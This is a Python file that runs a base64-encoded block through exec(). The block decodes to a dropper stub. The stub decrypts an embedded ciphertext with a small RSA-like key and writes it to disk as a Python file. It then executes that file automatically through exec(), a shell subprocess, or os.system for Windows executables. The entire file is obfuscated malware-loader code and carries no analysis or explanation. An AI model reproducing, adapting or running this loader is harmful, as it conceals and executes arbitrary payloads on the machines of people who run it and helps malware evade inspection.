import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk0yVm1NVEl5Tmc9PU1USTJNQT09TVRKaE1BPT1NMlZtTmpsbE1URm1NQT09TVRKaE1BPT1NMlZtTVRGak1BPT1Nakk0TVRKaE1BPT1NMlZtTVRnMU1USmpZUT09TVRKaE1BPT1NMlZtTVRJeU5nPT1NalE0TVRKaE1BPT1NMlZtTVdJeU1qZGhNVEpoTUE9PU0yVm1ZMlkyTWpJNE1USmhNQT09TTJWbU1XSXlOVEkwTVRKaE1BPT1NMlZtTVRGak1BPT1Nakk0TVRKaE1BPT1NVEkyTUE9PU1UZzFNVEpqWVE9PU1USmhNQT09TTJWbU1USXlOZz09TVRGbU1BPT1NVEpoTUE9PU0yVm1NVGcxTlRJME1USmhNQT09TTJWbU1USXlOZz09TWpRNE1USmhNQT09TTJWbU5qbGxNVEkwTlE9PU1USmhNQT09TTJWbU5qbGxNamRoTVRKaE1BPT1NMlZtTVRJeU5nPT1NVEkwTlE9PU1USmhNQT09TTJWbU1USXlOZz09TnpjeU1USmhNQT09TTJWbU5qbGxNVEkwTlE9PU1USmhNQT09TTJWbVkyWTJNamRoTVRKaE1BPT1NMlZtTVRJeU5nPT1NVEkwTlE9PU1USmhNQT09TTJWbU1USXlOZz09TWpJNE1USmhNQT09TTJWbU5qbGxNVEkwTlE9PU1USmhNQT09TTJWbVkyWTJNamRoTVRKaE1BPT1NMlZtTVRJeU5nPT1NVEkwTlE9PU1USmhNQT09TTJWbU1USXlOZz09TWpJNE1USmhNQT09TTJWbU5qbGxNVEkwTlE9PU1USmhNQT09TTJWbU5qbGxOVEkwTVRKaE1BPT1NMlZtTVdJeU1qSTRNVEpoTUE9PU0yVm1NVEl5Tmc9PU1qSTRNVEpoTUE9PU1USTJNQT09TVRnMU1qUTRNVEpoTUE9PU0yVm1ZMlkyTlRJME1USmhNQT09TTJWbU1USXlOZz09TVRGbU1BPT1NVEpoTUE9PU0yVm1NVEJoTnc9PU1qSTRNVEpoTUE9PU0yVm1OamxsTVRJME5RPT1NVEpoTUE9PU1USTJNQT09TVRnMU1URm1NQT09TVRKaE1BPT1NMlZtTVdJeU1qZGhNVEpoTUE9PU0yVm1NVEZqTUE9PU1qUTRNVEpoTUE9PU0yVm1ZMlkyTWpJNE1USmhNQT09TVRJMk1BPT1NVEJpTUE9PU56Y3lNVEpoTUE9PU1USTJNQT09TVRCaU1BPT1OemN5TVRKaE1BPT0iCmRycG5tID0gImFhYV9PN1RZWUI4LnB5IgpwayA9ICgzMDE5LCA1MTgzKQoKZGVmIGRjeShwaywgY3B0eCk6CglrLCBuID0gcGsKCW1lbnNhamVSZWNpYmlkbyA9IF9fcmVCYTY0X18oY3B0eC5lbmNvZGUoJ3V0Zi04JykpCgltZW5zYWplSGV4UmVjaWJpZG8gPSBfX2JhNjRIZXhfXyhtZW5zYWplUmVjaWJpZG8pCgltZW5zYWplRGVjaW1hbFJlY2liaWRvID0gX19oZXhEZWNfXyhtZW5zYWplSGV4UmVjaWJpZG8pCgltZW5zYWplRGVzY2lmcmFkbyA9IFsoKGMgKiogaykgJSBuKSBmb3IgYyBpbiBtZW5zYWplRGVjaW1hbFJlY2liaWRvXQoJbWVuc2FqZV9kZV9hc2NpaSA9IF9fZGVBU19fKG1lbnNhamVEZXNjaWZyYWRvKQoJZGVjYXNjID0gX19yZUJhNjRfXygnJy5qb2luKG1lbnNhamVfZGVfYXNjaWkpLmVuY29kZSgpKQoJaGV4YmE2NCA9IF9fYmE2NEhleF9fKGRlY2FzYykKCWFzaGV4ID0gX19oZXhEZWNfXyhoZXhiYTY0KQoJZGVhc2MgPSBfX2RlQVNfXyhhc2hleCkKCWJhNjQgPSBiYXNlNjQuYjY0ZGVjb2RlKGRlYXNjLmVuY29kZSgpKQoJcmV0dXJuIGJhNjQKZGVmIF9fcmVCYTY0X18obSk6CgltQmE2NCA9IFttW2k6aSs0XSBmb3IgaSBpbiByYW5nZSgwLCBsZW4obSksIDQpXQoJcmV0dXJuIG1CYTY0CmRlZiBfX2JhNjRIZXhfXyhtKToKCW1IeCA9IFtiYXNlNjQuYjY0ZGVjb2RlKGI2NCkgZm9yIGI2NCBpbiBtXQoJcmV0dXJuIG1IeApkZWYgX19oZXhEZWNfXyhtKToKCW1EZWMgPSBbaW50KGhleGEuZGVjb2RlKCJVVEYtOCIpLCAxNikgZm9yIGhleGEgaW4gbV0KCXJldHVybiBtRGVjCmRlZiBfX2RlQVNfXyhtKToKCW0xID0gJycuam9pbihbY2hyKGQpIGZvciBkIGluIG1dKQoJcmV0dXJuIG0xCmRlZiBfX21lQVNfXyhtKToKCW1lbiA9IFtvcmQocCkgZm9yIHAgaW4gbV0KCXJldHVybiBtZW4KZGN5X2RhdGEgPSBkY3kocGs9cGssIGNwdHg9Y2R4KQoKaW1hZ2VfZXh0ZW5zaW9ucyA9ICgnanBnJywgJ2pwZWcnLCAnYnBtJywgJ2ljbycsICdwbmcnKQpleGVjX2V4dGVuc2lvbnMgPSAoJ2JhdCcsICdleGUnLCAndmJzJywgJ3BzMScpCnB5dGhvbl9leHRlbnNpb25zID0gKCdweScpCm5mID0gb3BlbihkcnBubSwgJ3diJykKdHJ5OgoJbmYud3JpdGUoZGN5X2RhdGEpCmV4Y2VwdDoKCXBhc3MKbmYuY2xvc2UoKQppZiBvcy5wYXRoLmV4aXN0cyhkcnBubSk6CglpZiBkcnBubS5zcGxpdCgnLicpWzFdIGluIGltYWdlX2V4dGVuc2lvbnM6CgkJaW1hZ2VWaWV3ZXJGcm9tQ29tbWFuZExpbmUgPSB7J2xpbnV4JzoneGRnLW9wZW4nLCAnd2luMzInOidleHBsb3JlcicsICdkYXJ3aW4nOidvcGVuJ31bc3lzLnBsYXRmb3JtXQoJCXN1YnByb2Nlc3MucnVuKFtpbWFnZVZpZXdlckZyb21Db21tYW5kTGluZSwgZHJwbm1dLCBjbG9zZV9mZHM9VHJ1ZSkKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gZXhlY19leHRlbnNpb25zIGFuZCBzeXMucGxhdGZvcm0gPT0gJ3dpbjMyJzoKCQlvcy5zeXN0ZW0oZHJwbm0pCglpZiBkcnBubS5zcGxpdCgnLicpWzFdIGluIHB5dGhvbl9leHRlbnNpb25zOgoJCWV4ZWMoZGN5X2RhdGEpCgkJcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oJ3B5dGhvbiB7Zm59Jy5mb3JtYXQoZm49ZHJwbm0pLCBzaGVsbD1UcnVlLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCg=='
exec(base64.b64decode(data))